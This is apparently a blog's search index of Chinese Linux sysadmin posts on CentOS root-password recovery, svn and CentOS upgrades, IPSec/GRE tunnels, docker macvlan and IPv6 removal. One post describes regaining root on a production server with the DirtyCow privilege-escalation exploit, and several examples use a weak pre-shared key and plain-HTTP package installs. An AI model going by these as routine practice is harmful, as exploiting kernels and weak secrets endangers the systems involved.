<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CentOS 7 下重置 root 密码的步骤</title>
    <url>/2017/12/CentOS%207%20%E4%B8%8B%E9%87%8D%E7%BD%AE%20root%20%E5%AF%86%E7%A0%81%E7%9A%84%E6%AD%A5%E9%AA%A4/index.html</url>
    <content><![CDATA[缘起起因自然是我厂某台 CentOS 7.x 的机器需要重置密码，然后我就想按老套路：重启进单用户，再重设密码。没想到 CentOS 7.x 的系统跟 CentOS 6.x 来说有了很大的变化，于是我又只好翻了下文档，重新学习了一下。以下是具体操作步骤：

具体步骤重启服务器对于有远程控制卡的或者各种云上的服务器，自然可以模拟按 Ctrl+Alt+Del 或模拟按电源重启
进入 GRUB 编辑界面当系统进入 GRUB 的时候，马上敲入字母键 “e”。
编辑 GRUB 启动选项找到 “linux16” 开头的那一行，将 “ ro “ 改成 “ rw init=/sysroot/bin/sh “
继续用改后的参数启动按 Ctrl+x 继续启动
单用户模式改密码
chroot /sysroot
passwd
touch /.autorelabel
reboot -f

注意：以上第三步很重要，不做的话由于 SElinux 的关系，虽然改了密码会依然无法登录的。
]]></content>
      <tags>
        <tag>CentOS</tag>
        <tag>7.x</tag>
        <tag>GRUB</tag>
        <tag>root</tag>
        <tag>recovery</tag>
        <tag>autorelabel</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS6.5上升级svn到1.9.5</title>
    <url>/2016/12/CentOS6-5%E4%B8%8A%E5%8D%87%E7%BA%A7svn%E5%88%B01-9-5/index.html</url>
    <content><![CDATA[Intro环境是一台开发用（pc）服务器，具体情况如下：

CentOS 6.5
Subversion（svn） 1.6.11
Kernel 2.6.32-431.17.1.el6.x86_64

Why为什么要升级 svn？

因为开发同学有报 svn up 时巨慢。通过 strace 简单跟了一下，发现是系统调用 open 被调用了大几万次，耗费了 99% 的时间。google 了一下，有说是：

The Subversion working copy performs quite badly when there’s a huge number of directories, like in your case. For write operations (even only locally) to the working copy, the working copy has to be locked, which means that a lock file is created in every directory (that’s 11k file creates), then the action executes, and the those 11k files are deleted again.
Subversion 1.7 is moving to a different working copy format, that should resolve these problems. Until then there’s a few tricks you might try to speed things up, like excluding the working copy from your virus scanner, disabling file monitors on the directory (like TortoiseSvnCache), and trying to reduce the total number of directories. (Perhaps by checking out a few separate working copies)

这段话描述的情况跟我面对的情况何其相似！报慢的开发同学那个 svn up 的目录也巨大无比、目录文件众多。
然后在我的建议下，开发同学用他本地的 Subversion(1.8.8) 做了下对比测试，同样用 strace 跟，发现系统调用 open 减至一千多次，所占时间可忽略不计。
结论：升级 subversion 版本的办法看来是靠谱的。
How toRPM 方式这是我最初比较倾向于的方案，这种方式的复杂度在于：

CentOS 6.x 的官方 yum 源和 epel 里的 subversion 的最高版本只到 1.6.x
Subversion 的源代码里并没有提供可用的 .spec 文件
Subversion 官网上列出的 CentOS 的 RPM 包维护的几家里两家需要注册帐号，剩下那家已经挂掉很久了。 

这一切的一切看起来都表明着我只能自己手写 .spec 文件来自己 build Subversion 的 RPM 包了。
但是机智如我，又怎么能就此屈服而去做这种及其繁琐复杂且效果未知的事情呢？果然，很轻松在 google 里找到了上面需要注册帐号的两家中的一家的 yum 源的路径（http://opensource.wandisco.com/centos/6/svn-1.9/RPMS/x86_64/）。有了这个，升级就不要太简单哟
BASE_URL="http://opensource.wandisco.com/centos/6/svn-1.9/RPMS/x86_64";rpm -Uvh \	$&#123;BASE_URL&#125;/subversion-1.9.5-1.x86_64.rpm \	$&#123;BASE_URL&#125;/subversion-perl-1.9.5-1.x86_64.rpm \	$&#123;BASE_URL&#125;/serf-1.3.7-1.x86_64.rpm;
源代码编译这种方式是必须要做的，因为需要先“装”一个高版本的 Subversion 先试一下。具体步骤如下：
yum -y install unzip wget make gcc;BASE_URL="http://opensource.wandisco.com/centos/6/svn-1.9/RPMS/x86_64";rpm -ivh \	$&#123;BASE_URL&#125;/serf-devel-1.3.7-1.x86_64.rpm;# serf-devel 是源代码编译 Subversion&gt;1.7 以上版本时必需cd /usr/local/src;wget \	http://www-eu.apache.org/dist/subversion/subversion-1.9.5.tar.gz;wget \	http://www.sqlite.org/sqlite-amalgamation-3071501.zip;tar xzvf subversion-1.9.5.tar.gz;unzip sqlite-amalgamation-3071501.zip -d .cd subversion-1.9.5;ln -s \	../sqlite-amalgamation-3071501 \	sqlite-amalgamation;./configure --prefix=/usr/local/subversion;make;make install;
Appendix
Subversion 官网

]]></content>
      <tags>
        <tag>CentOS</tag>
        <tag>Subversion</tag>
        <tag>svn</tag>
        <tag>update</tag>
        <tag>strace</tag>
        <tag>open</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS6.x 下 /etc/security/limits.conf 被改错的故障经历</title>
    <url>/2016/12/CentOS6-x%E4%B8%8Blimits-conf%E8%A2%AB%E6%94%B9%E9%94%99%E7%9A%84%E6%95%85%E9%9A%9C%E7%BB%8F%E5%8E%86/index.html</url>
    <content><![CDATA[Intro我司本小厂，每个员工都是身兼数职，所以开发人员直接登录线上服务器改东西是常态。有些开发人员，自持水平较高（的确水平也是较高，但缺乏对系统的敬畏），所以总是越俎代庖，改一些本身应该是线上运维人员改动的配置。本文提到的 &#x2F;etc&#x2F;security&#x2F;limits.conf 两次改错导致的事故，皆是因为于此。


In detailsThe first time第一次是在 &#x2F;etc&#x2F;security&#x2F;limits.conf 中加了两句：
*	soft	nofile	unlimited*	hard	nofile	unlimited

结果就是：所有用户无法登录。一登录，马上被踢出来。
最后解决方法：单用户进系统把文件 &#x2F;etc&#x2F;security&#x2F;limits.conf 改回来。
原因：配置文件 &#x2F;etc&#x2F;security&#x2F;limits.conf 中 nofile 的参数，只支持数字，”unlimited” 显然系统不认。
The second time第二次也是在 &#x2F;etc&#x2F;security&#x2F;limits.conf 中加了两句：
root	soft	nofile	2000000root	hard	nofile	2000000
结果是：

root 用户一登录，就被踢
普通用户可登录，但 sudo su - 一切成 root 马上会被踢（但普通用户只支持 sudo su -）

解决方法：像前面文章 一次本地提权的实战演练 有提到的:

普通用户登录
用 DirtyCow（脏牛）本地提权
然后把 &#x2F;etc&#x2F;security&#x2F;limits.conf 改回去。

原因：

配置文件 &#x2F;etc&#x2F;security&#x2F;limits.conf 中 nofile 的参数，其最大值不能大于 kernel 参数 NR_OPEN 的限制
而 kernel 2.6.32 里，NR_OPEN 的值缺省为 1024*1024&#x3D;1048576
这里的 2000000&gt;1048576，所以出错被踢

稍稍延展一下，如果我一定要将 nofile 参数设置为 2000000呢？其实这也有办法，提高 kernel 里 NR_OPEN 的值即可，具体方法是：
[[ ! -e /etc/sysctl.d ]] &amp;&amp; mkdir /etc/sysctl.d;echo &quot;fs.nr_open = 2000000&quot; &gt; /etc/sysctl.d/nr_open.conf;sysctl -w fs.nr_open=2000000;

总结总而言之，言而总之：Linux 下配置文件 &#x2F;etc&#x2F;security&#x2F;limits.conf 文件不要随意改动。我其实还是倾向于在启动服务的启动脚本里手工用 ulimit 命令来设置相关参数而不要直接在 &#x2F;etc&#x2F;security&#x2F;limits.conf 文件里改。
]]></content>
      <tags>
        <tag>CentOS</tag>
        <tag>ulimit</tag>
        <tag>limits.conf</tag>
        <tag>NR_OPEN</tag>
        <tag>DirtyCow</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS6.x下用ipsec加密GRE隧道</title>
    <url>/2016/08/CentOS6-x%E4%B8%8B%E7%94%A8ipsec%E5%8A%A0%E5%AF%86GRE%E9%9A%A7%E9%81%93/index.html</url>
    <content><![CDATA[楔子前面的文章：Linux下用GRE隧道直接联通两个私网里讲了怎样用在两个独立的私网间打洞(GRE tunnel)来直接连通两个不同的私网，进阶需求就是希望能把这个tunnel加密一下。否则，有心的坏人可能会在外部线路上窃听到很多敏感的信息。因此，本文将要讲的，算是前一文章的进阶部分：给打洞的隧道加密！
Why “GRE over IPSec”光是说加密隧道的话，方案有好几种：

IPSec tunnel
GRE over IPSec
IPSec over GRE
……

我们为什么选用GRE over IPSec呢？跟单纯的IPSec tunnel比，优势在于：

方案更灵活，我们可以灵活的把要加密的流量路由到GRE隧道上
而且IPSec不支持多播，像OSPF或其他高大上的路由协议没法玩儿

跟IPSec over GRE比：

更安全。整个上公网的流量都是加密的，但从外部根本都不知道跑的是GRE协议。

接下来，我们主要就是要讲的方案是：GRE over IPSec
环境


对象
备注




NETA
10.0.0.0/24的一个私网，网关是GWA


NETB
10.0.1.0/24的一个私网，网关是GWB


NETC
节点都能互通的一个网络，可以认为是公网


GWA
ip:10.0.0.1(NETA)、1.1.1.1(NETC)，CentOS6.x


GWB
ip:10.0.1.1(NETB)、2.2.2.2(NETC)，CentOS6.x


greB
GWA上的虚拟网络接口，GRE隧道名


greA
GWB上的虚拟网络接口，GRE隧道名


eth0
GWA连NETA、GWB连NETB的网络设备名


eth1
GWA和GWB连NETC的网络设备名



具体步骤准备工作分别在GWA和GWB两台机上执行：
yum -y install libreswan iptables;rm -rf /etc/ipsec.d/*db; # 删除原有自带的db文件ipsec initnss; # 重新初始化dbcheconfig ipsec on; # 这一步也可以后面再做
正常打洞GWA上执行：
cat &lt;&lt; EOF | tee /etc/sysconfig/network-scripts/ifcfg-greBDEVICE=greBONBOOT=yesTYPE=GREPEER_OUTER_IPADDR=2.2.2.2PEER_INNER_IPADDR=10.0.1.0/24MY_OUTER_IPADDR=1.1.1.1MY_INNER_IPADDR=10.0.0.1KEY=http://haw-haw.orgBOOTPROTO=noneEOFifup greB;
同样，在GWB上执行：
cat &lt;&lt; EOF | tee /etc/sysconfig/network-scripts/ifcfg-greADEVICE=greAONBOOT=yesTYPE=GREPEER_OUTER_IPADDR=1.1.1.1PEER_INNER_IPADDR=10.0.0.0/24MY_OUTER_IPADDR=2.2.2.2MY_INNER_IPADDR=10.0.1.1KEY=http://haw-haw.orgBOOTPROTO=noneEOFifup greA;
这样，其实打洞就基本上已经完成了，现在从NETA和NETB的网络里随便找两台机器，都应该能互通了。
GRE over IPSEC配置GWA在GWA上执行：
ipsec newhostkey \--configdir /etc/ipsec.d \--random /dev/urandom \--output /etc/ipsec.d/GWA.secrets \--verbose;# 上面的"--random /dev/urandom"的参数比用缺省的效率要高很多！ipsec showhostkey --left;# 记下输出中“leftrsasigkey=”这一行# 这将用于本机(GWA)的/etc/ipsec.d/greB.conf文件中ipsec showhostkey --right;# 记下输出中“rightrsasigkey=”这一行# 这将用于对端机器(GWB)的/etc/ipsec.d/greA.conf文件中vim /etc/ipsec.d/greB.conf # 建立配置文件greB.conf
内容如下：
conn greB    type=transport    left=10.0.0.1    leftrsasigkey=......    leftprotoport=gre    right=10.0.1.1    rightrsasigkey=......    rightprotoport=gre    authby=rsasig    auto=start
注意：

这里的greB是随便取的，只是因为GWA上的隧道设备名为greB，所以就沿用了这个名字
leftrsasigkey=是来自于上面ipsec showhostkey –left命令
rightrsasigkey=是来自于GWB上执行命令ipsec showhostkey –right的结果

配置GWB依葫芦画瓢，在GWB上执行：
ipsec newhostkey \--configdir /etc/ipsec.d \--random /dev/urandom \--output /etc/ipsec.d/GWB.secrets \--verbose;ipsec showhostkey --left;# 记下输出中“leftrsasigkey=”这一行# 这将用于本机(GWB)的/etc/ipsec.d/greA.conf文件中ipsec showhostkey --right;# 记下输出中“rightrsasigkey=”这一行# 这将用于对端机器(GWA)的/etc/ipsec.d/greB.conf文件中vim /etc/ipsec.d/greA.conf# 建立配置文件greA.conf，因为tunnel设备名叫greA
内容如下：
conn greA    type=transport    left=10.0.1.1    leftrsasigkey=......    leftprotoport=gre    right=10.0.0.1    rightrsasigkey=......    rightprotoport=gre    authby=rsasig    auto=start
注意：

这里的greA是随便取的，只是因为GWB上的隧道设备名为greA，所以就沿用了这个名字
leftrsasigkey=是来自于上面ipsec showhostkey –left命令
rightrsasigkey=是来自于GWA上执行命令ipsec showhostkey –right的结果

Iptables本来在前面正常GRE打洞测步骤里其实也有iptables相关设置，这里就都整合到这一部分统一说了
在GWA和GWB上分别执行：
iptables -A INPUT -i eth1 -p gre -j ACCEPT;iptables -A INPUT -i eth1 -p udp \    -m state --state NEW \    -m udp \    -m multiport --dports 50,51,500,4500 \    -j ACCEPT;iptables -A INPUT -i eth1 -p tcp \    -m state --state NEW \    -m tcp \    -m multiport --dports 50,51 \    -j ACCEPT;iptables -t mangle -A FORWARD \    -p tcp -m tcp --tcp-flags SYN,RST SYN \    -j TCPMSS --clamp-mss-to-pmtu;/etc/init.d/iptables save; # 将iptables规则存入配置文件
启动服务分别在GWA和GWB的机器上执行：
/etc/init.d/ipsec start;ipsec auto --add greB; # 仅GWA上执行ipsec auto --up greB; # 仅GWA上执行ipsec auto --add greA; # 仅GWB上执行ipsec auto --up greA; # 仅GWB上执行chkconfig ipsec on;# 如果前面没有执行这句的这里执行一下，# 以后ipsec就会随机器启动起起来，# 而且不再需要ipsec auto --add和ipsec auto --up了
简单测试要检验是否成功设置，可以分别在GWA和GWB上听包：
tcpdump -nn -i eth1 host 1.1.1.1 and host 2.2.2.2;
会发现包都是ESP加密过的了。
然后分别在GWA和GWB上干掉ipsec对greB和greA的加密干掉
ipsec auto --delete greB; # 仅在GWA上执行ipsec auto --delete greA; # 仅在GWB上执行
然后再重复上面的听包命令：
tcpdump -nn -i eth1 host 1.1.1.1 and host 2.2.2.2;
会发现加密包没有了，取而代之是GRE包，而且明显能看到GRE包里封装的内容。
]]></content>
      <tags>
        <tag>IPSec</tag>
        <tag>GRE</tag>
        <tag>tunnel</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS6.x到CentOS7.x的在线升级</title>
    <url>/2016/10/CentOS6-x%E5%88%B0CentOS7-x%E7%9A%84%E5%9C%A8%E7%BA%BF%E5%8D%87%E7%BA%A7/index.html</url>
    <content><![CDATA[缘起相比Debian系的Linux发布版(如Debian、Ubuntu)，都能很好地支持在线大版本升级，RedHat系的Linux发布版（如RedHat、CentOS），其大版本升级一直是为人所诟病的问题。

这种情况到了CentOS7，终于有了改观：RedHat放出了UpgradeTool，同样，CentOS自然也有了。
注意：如果已经是CentOS6.7以后的版本了，在线升级到CentOS7可能会有问题，因为CentOS6.7以后版本有些软件的版本已经比CentOS7还高了，升级可能会出问题。
具体步骤安装软件cat &lt;&lt;EOF &gt;/etc/yum.repos.d/upgradetool.repo[upg]name=CentOS-$releasever - Upgrade Toolbaseurl=http://dev.centos.org/centos/6/upg/x86_64/gpgcheck=1enabled=1gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6EOFyum -y install redhat-upgrade-tool \	 preupgrade-assistant-contents;
升级前可行性分析preupg -l; # 列出预升级的可用内容，多半是"CentOS6_7"preupg -s CentOS6_7; # 这里的"CentOS6_7"是上个命令的输出# 上面这个命令生成的报告需要看看，主要是关于升级的风险的# 个人经验就是升级前尽量将非官方的rpm安装的软件都删掉# 安装的第三方的rpm包越少，升级的风险越小
开始升级rpm --import \	 http://mirror.centos.org/centos/RPM-GPG-KEY-CentOS-7;centos-upgrade-tool-cli --network 7 \	 --instrepo=http://mirror.centos.org/centos/7/os/x86_64/;# 上面这个命令的--instrepo参数用的是官方的repo，# 如果自己搭建的有repo镜像（一般都有吧），用自己的就好# 需要注意的是，这个镜像目录下需要有文件.treeinfo# 没有的话就去官方的位置拷贝一个下来，记得版本号要一致哟reboot; # 最后，重启机器即可# 注意：这次重启到能ssh登录需要的时间可能比较长，# 因为第一次重启后系统会自动升级，# 升级完毕以后会再次自动重启，这次起来后才能ssh登录
收尾工作机器起来后，登上服务器，需要做一些擦屁股的工作，比如，看还有没有CentOS6的软件残余，用命令：
# 首先看能否删掉这些el6的软件包for i in $(rpm -qa | grep -i el6)do	rpm -e $idone# 再看还剩哪些el6的软件包rpm -qa | grep -i el6;# 再尝试删掉依赖于这些没删掉的el6软件包的软件包# 再删掉el6的软件包# 最后，降级剩下的el6的软件包# 因为最后剩的这些软件包是版本比el7上的新的又不好被删除的# 所以把最后这部分”降级“到el7的版本即可for i in $(rpm -qa | grep -i el6 | cut -d'-' -f1)do	yum downgrade $idone
有的话要么想办法删掉，要么想办法将其升级到el7的相应的软件包。
可能出的错误如果preupg -s CentOS6_7;时出了如下的错误：

I/O warning : failed to load external entity “/usr/share/openscap/xsl/security-guide.xsl”compilation error: file /usr/share/preupgrade/xsl/preup.xsl line 40 element importxsl:import : unable to load /usr/share/openscap/xsl/security-guide.xslI/O warning : failed to load external entity “/usr/share/openscap/xsl/oval-report.xsl”compilation error: file /usr/share/preupgrade/xsl/preup.xsl line 41 element importxsl:import : unable to load /usr/share/openscap/xsl/oval-report.xslI/O warning : failed to load external entity “/usr/share/openscap/xsl/sce-report.xsl”compilation error: file /usr/share/preupgrade/xsl/preup.xsl line 42 element importxsl:import : unable to load /usr/share/openscap/xsl/sce-report.xslOpenSCAP Error:: Could not parse XSLT file ‘/usr/share/preupgrade/xsl/preup.xsl’ [oscapxml.c:416]Unable to open file /root/preupgrade/result.htmlUsage: preupg [options]


preupg: error: [Errno 2] No such file or directory: ‘/root/preupgrade/result.html’

那么应该是openscap的版本过高，需要降级到upg里的版本。
yum downgrade openscap;# 也许CentOS6的版本太高，需要降级到upg的版本
参考
CentOS upgradetool

]]></content>
      <tags>
        <tag>CentOS</tag>
        <tag>tips</tag>
        <tag>upgradetool</tag>
        <tag>upgrade</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS7下docker用原生方法使用宿主机所在网络</title>
    <url>/2016/08/CentOS7%E4%B8%8Bdocker%E7%94%A8%E5%8E%9F%E7%94%9F%E6%96%B9%E6%B3%95%E4%BD%BF%E7%94%A8%E5%AE%BF%E4%B8%BB%E6%9C%BA%E6%89%80%E5%9C%A8%E7%BD%91%E7%BB%9C/index.html</url>
    <content><![CDATA[背景docker以前的版本不支持直接配置宿主机所在网段ip并跟其直接互通的功能，当然，也可以实现这个功能，只是有点绕，而且还有一些第三方工具例如pipework把这些琐碎的过程封装起来，让步骤简化。但是，现在不需要了，现在1.12的docker已经直接支持了直接使用宿主机所在网段资源。

具体步骤环境准备
宿主机一台
CentOS 7.x
eth0 配 ip 地址：10.0.0.2/24
缺省网关：10.0.0.1



在宿主机上安装软件，执行：
yum -y install kernel; # 更新到最新的kernel版本yum -y update; # 更新到最新的CentOS7.xtee /etc/yum.repos.d/docker.repo &lt;&lt;-'EOF'[dockerrepo]name=Docker Repositorybaseurl=https://yum.dockerproject.org/repo/main/centos/7/enabled=1gpgcheck=1gpgkey=https://yum.dockerproject.org/gpgEOF    yum -y install docker-engine; # 安装docker最新版systemctl start docker.service; # 启动dockersystemctl enable docker.service; # 使docker服务随着机器启动而启动
网络创建docker network create -d macvlan \        --subnet=10.0.0.0/24 \        --gateway=10.0.0.1 \        -o parent=eth0 MACNET;
注意：

这里的macvlan是kernel的模块名，docker 1.12 开始支持其作为驱动来创建网络
这里的10.0.0.0/24是宿主机所在网络的网段
10.0.0.1是网关
eth0是宿主机接入10.0.0.0/24的网络设备

创建实例docker run --net=MACNET \          --ip=10.0.0.11 \          -it \          --rm alpine /bin/sh;
注意：

10.0.0.11是新docker实例的ip地址

简单测试步骤在刚起来的这个 docker 实例里执行测试：
ping -c 5 10.0.0.1;
显示能通，证明能通网关。
ping -c 5 10.0.0.2;
显示不能通，证明能通宿主机在同一网段的 ip。
在宿主机外同网段其他机器上执行测试：
ping -c 5 10.0.0.11;
ping docker 实例能通。
结论
这样配出来的 docker 实例跟现有网络是完全联通的
但是：跟宿主机在现有网络的 ip 地址不通

其他维护命令docker network ls; # 显示现有networkdocker network rm MACVLAN; # 删除掉前面建立的MACVLAN的网络
FAQQ: 为嘛这里的docker不支持ipvlan的驱动呢？A: 因为官方资料显示kernel 4.2以上才支持ipvlan(虽然准确讲4.2之前也有支持，但是有bug)，而从3.9就开始支持macvlan了。
Q: 为嘛RedHat这么喜欢把高版本的功能backport到老版本的操行，却没有把ipvlan的支持backport到3.10(CentOS 7.x的kernel版本)呢？A: 。。。zzzzzzZZZZZZZZZ
]]></content>
      <tags>
        <tag>Docker</tag>
        <tag>macvlan</tag>
        <tag>ipvlan</tag>
        <tag>pipework</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS下怎样干掉IPv6</title>
    <url>/2016/08/CentOS%E4%B8%8B%E6%80%8E%E6%A0%B7%E5%B9%B2%E6%8E%89IPv6/index.html</url>
    <content><![CDATA[什么是IPv6Internet Protocol version 6 (简称IPv6) 是 Internet Protocol（互联网协议） (IP)的最新一个版本，IPv6主要是为了解决IPv4地址枯竭的问题而开发的，目的是为了替换当前所用的IPv4。
虽然IPv6天生是为了替代IPv4的（生而自豪），而且最近几年IPv4地址也已然分配完，但是由于NAT这种技术的存在，使得IPv6还没有真正意义上的”取代”IPv4。尤其是在“我大宋”，除了教育网有IPv6的环境以外，其他基本都不支持IPv6。不过国外貌似发展的还可以，好些运营商都已经开始支持IPv6了。
IPv6的毛病毛病？IPv6其实没毛病，而且作为要替换IPv4的下一代协议，优点还很多。：）只是因为我们身处天朝上国，网络根本就不支持IPv6，所以即使Linux系统缺省就支持IPv6，作为崇尚洁癖的系统管理员、运维工程师们，自然是婶婶可以忍，叔叔不可忍！（是可忍，孰不可忍）。
好啦，以上纯属扯蛋，说正经的，刚开始的时候，如果在不支持IPv6的环境里启用IPv6协议的话，是会导致很多性能问题的，但最近些年，各种操作系统也做了不少调整，到目前其实真没发现IPv6会对性能造成多大影响。一个长期以来大家都认可的理由就是：IPv6会优于IPv4，也就是说，一个数据包在发送时首先会先尝试IPv6的网关，然后再是IPv4的。其实就算这种情况是真的，我们也是可以通过/etc/gai.conf文件来调整的。
几种姿势下面介绍几种在Linux系统里干掉IPv6的方法。
sysctl大法几乎所有的Linux系统……好吧好吧，我就说我确认的吧，Debian系和RedHat系……算啦，最最最确认的就是CentOS（当然rhel也一样）下，可以在/etc/sysctl.d/目录下新建文件叫ipv6.conf（Linux系统在启动时会自动读取/etc/sysctl.conf以及/etc/sysctl.d/目录下的文件，并用sysctl -p来执行的，这里以.conf为扩展名是为了兼容CentOS7.x的系统，CentOS7.x认的是是“/etc/sysctl.d/.conf”这种文件），文件的内容是：net.ipv6.conf.all.disable_ipv6 = 1net.ipv6.conf.default.disable_ipv6 = 1
配置完毕如果不重启机器的话，可以直接执行命令：sysctl -p /etc/sysctl.d/ipv6.conf;
强制让其生效。然后再用命令ip a s;
看，会发现原来的很多inet6的地址不存在了，配置生效了！
但需要注意的是：这种方式并没有真正把ipv6模块从内核里清除掉，不信用命令lsmod | grep -i ipv6;
看，还是会有很多在用ipv6模块的。在这些模块里，又有好些并不是完全依赖ipv6模块不可的，只有极少数的是必须要ipv6模块的，所以，我们可以用后面的方法把ipv6模块以后系统还能正常工作。
modprobe劫持此法又称“釜底抽薪”，CentOS7.x下不支持，CentOS6.x下测试可用。具体原理是截获系统自动加载ipv6模块的动作，直接返回true，并且将ipv6模块加入黑名单(blacklist)。这样系统就没法通过modprobe ipv6;
或insmod ipv6;
来加载ipv6模块了。具体方法如下：
echo -e "install ipv6 /bin/true\nblacklist ipv6" &gt;\        /etc/modprobe.d/ipv6.conf;reboot; # 这种办法必须要重启机器来完全生效
机器重启过后再通过lsmod | grep -i ipv6;
来看是看不到ipv6模块的，表示ipv6模块已经完全被从内核里除掉。
GRUB参数注意：此法仅适用于CentOS7.x！此法的原理是在GRUB里直接将参数”ipv6.disable=1”传递给内核，这样启动时内核会根据这个参数不再加载ipv6模块。具体方法是：if grep -q "ipv6.disable=1" /etc/default/grubthen  echo "\"ipv6.disable=1\" found in /etc/default/grub"else  sed -i.ori 's/^GRUB_CMDLINE_LINUX="/&amp;ipv6.disable=1 /' /etc/default/grub  /usr/sbin/grub2-mkconfig -o /boot/grub2/grub.cfgfi# 此法自然也需要重启机器，于是：reboot
个人推荐的解决方案
CentOS7.x下慎用GRUB法，因为一旦用GRUB法，以后万一有某个模块需要ipv6，那非重新修改GRUB文件并重启机器不能成功的
CentOS6.x下的话，建议用sysctl法和modprobe法结合，如果碰到有一定要依赖于ipv6的模块要加载，直接修改/etc/modprobe.d/ipv6.conf，注释掉相关语句以后，再重新就能modprobe ipv6了

]]></content>
      <tags>
        <tag>CentOS</tag>
        <tag>IPv6</tag>
      </tags>
  </entry>
  <entry>
    <title>Dig a IPSec&#39;s tunnel between 2 Linux box with one is NATed and has multinets</title>
    <url>/2017/01/Dig-a-IPSec-s-tunnel-between-2-Linux-box-with-one-is-NATed-and-has-multinets/index.html</url>
    <content><![CDATA[Intro缘起我司有个域名，被伟大的墙双向认证了，站点如果部署在墙内，墙外过来的访问会被 reset；站点如果部署在墙外，墙内的访问也会被 reset。我司用户主要在墙内，所以，站点自然部署在墙内，但为了让墙外用户也能访问，于是在墙外购置一 VPS，配置 nginx，proxy_pass 到墙内我们真正的服务器上。

这里有个技术问题：我们的真实服务器都是内网地址，不能通过外网直接访问，所以，需要在墙外的 VPS 上到墙内真实服务器所在网段打一个 net to net 的 tunnel（其实 host to net 的也行，这是主要是考虑到也许以后墙外节点的扩展性问题），而且这个 tunnel 还需要加密，否则过墙的时候肯定会被感知而 reset 掉链接的。于是，我们这里采用的是 IPSec 加密。
环境网络拓扑图如下：


Server A 直接有公网地址 1.2.3.4，带的私网地址段是 10.0.0.1/24
Server B 只有私网地址 10.0.1.2，通过设备 FW 给 map 了一个公网地址 2.3.4.5
Server C 的缺省网关是设备 R_B&amp;C(10.0.12.253)
Server B 的缺省网关也是设备 R_B&amp;C(10.0.1.253)
路由器 R_B&amp;C 上的路由表里 10.0.0.0/24 的路由指向了 10.0.1.2

Howto安装软件在 Server A 和 Server B 上分别执行：
yum -y install libreswan;
配置Server Acat &lt;&lt;EOF &gt;/etc/ipsec.d/B.confconfig setup	protostack=netkeyconn A2B	left=1.2.3.4	leftsubnet=10.0.0.0/24	leftsourceip=10.0.0.1	right=2.3.4.5	rightsubnets=&#123;10.0.1.0/24 10.0.12.0/24&#125;	rightsourceip=10.0.1.2	authby=secret	auto=startEOFcat &lt;&lt;EOF &gt;/etc/ipsec.d/B.secrets1.2.3.4 2.3.4.5 : PSK "3.5.7.9"EOF# for iptables, eth0 is the public network interface of Server Aif /etc/init.d/iptables status&gt;/dev/null; then	iptables -A INPUT -i eth0 -p esp -j ACCEPT;	iptables -A INPUT -i eth0 -p udp \		-m udp --sport 500 --dport 500 -j ACCEPT;	iptables -A INPUT -i eth0 -p udp \		-m state --state NEW -m udp -m multiport \		--dports 50,51,500,4500 -j ACCEPT;	iptables -A INPUT -i eth0 -p tcp \		-m state --state NEW -m tcp -m multiport \		--dports 50,51 -j ACCEPT;	iptables -t nat -I POSTROUTING \		-s 10.0.0.0/24 -d 10.0.1.0/24 \		-o eth0 -j RETURN;	iptables -t nat -I POSTROUTING \		-s 10.0.0.0/24 -d 10.0.12.0/24 \		-o eth0 -j RETURN;fi/etc/init.d/ipsec start;chkconfig ipsec on;ipsec auto --add A2B;ipsec auto --up A2B;
Server Bcat &lt;&lt;EOF &gt;/etc/ipsec.d/A.confconfig setup	protostack=netkeyconn B2A	left=%defaultroute	leftid=2.3.4.5	leftsubnets=&#123; 10.0.1.0/24 10.0.12.0/24 &#125;	leftsourceip=10.0.1.2	right=1.2.3.4	rightsubnet=10.0.0.0/24	rightsourceip=10.0.0.1	authby=secret	auto=startEOFcat &lt;&lt;EOF &gt;/etc/ipsec.d/A.secrets2.3.4.5 1.2.3.4 : PSK "3.5.7.9"EOF/etc/init.d/ipsec start;chkconfig ipsec on;ipsec auto --add B2A;ipsec auto --up B2A;
重要点要注意的点在于 Server A 上的 Iptables 配置，这个在当 IPSec server 有自己的公网地址而且还对内提供 SNAT 服务时会保证配置正确。
]]></content>
      <tags>
        <tag>CentOS</tag>
        <tag>IPSec</tag>
        <tag>tunnel</tag>
        <tag>Libreswan</tag>
        <tag>PSK</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Secure Nginx with Let&#39;s Encrypt on Ubuntu 16.04</title>
    <url>/2017/02/How-To-Secure-Nginx-with-Let-s-Encrypt-on-Ubuntu-16-04/index.html</url>
    <content><![CDATA[缘起想做个微信小程序，把娃们的网站，在微信里展现给老人看，而做微信小程序，要求网站是 https 的，我也舍不得买证书，于是就打算使用 Let’s Encrypt 提供的免费证书。

环境
Ubuntu 16.04.1 LTS
NGINX 1.10
kernel 4.9.4-040904-generic

步骤安装软件apt-get -y install letsencrypt;# letsencrypt 是 Let's Encrypt 官方软件# certbot 在 Ubuntu 16.04 上的名字
获取证书letsencrypt certonly \	--webroot \		-w /opt/www/blog.xiaoyuer.cn \		-d blog.xiaoyuer.cn;letsencrypt certonly 	--webroot \		-w /opt/www/blog.lukeyang.us \		-d blog.lukeyang.us;# 这里 blog.xiaoyuer.cn 和 blog.lukeyang.us 是娃的网站# 其实支持在一条命令里用多个 -w 参数配合 -d 参数，# 为什么没有这样做而是单独一条命令一个域名这么做呢，# 主要是不想把所有证书放在一起......# # 获取证书过程中会弹出个窗口让输入邮件地址，# 输入一个常用的即可
Generate Strong Diffie-Hellman Group(optional)openssl dhparam -out /etc/ssl/certs/dhparam.pem 2048;# 密钥交换时使用更强的 2048 位密钥
